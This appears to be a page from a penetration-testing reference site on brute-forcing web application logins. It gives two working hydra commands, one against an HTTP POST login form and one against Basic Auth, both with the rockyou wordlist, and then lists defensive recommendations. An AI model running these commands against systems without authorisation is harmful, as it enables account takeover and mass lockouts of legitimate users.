---
layout: default
title: Brute Force
parent: Web Applications
nav_order: 1
permalink: /webapps/bruteforce/
---

# Brute Force
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

{: .warning }
> This exploit can **lock** a large amount of accounts. Be careful to **not perform to much attemps** on the same usernames or ensure to **know the enforced password policy** first.

## Vulnerability

Bruteforcing a web application consist in trying a large amount of password for one or multiple usernames until finding legit credentials.

## Prerequisites

* Access to the authentication form of the web application.

## Exploit

```bash
# HTTP brute force.
hydra -l $username -P /usr/share/wordlists/rockyou.txt $url http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:<ERROR_MSG>"

# Basic Auth (put https-get for TLS support).
hydra -l $username -P /usr/share/wordlists/rockyou.txt $url http-get
```

## Recommendations

- [ ] Use strong passwords that are not easily bruteforceable.
- [ ] Enfore strict password policies with account lockout or IP blocking threshold.
- [ ] Do not reuse passwords from an application to another.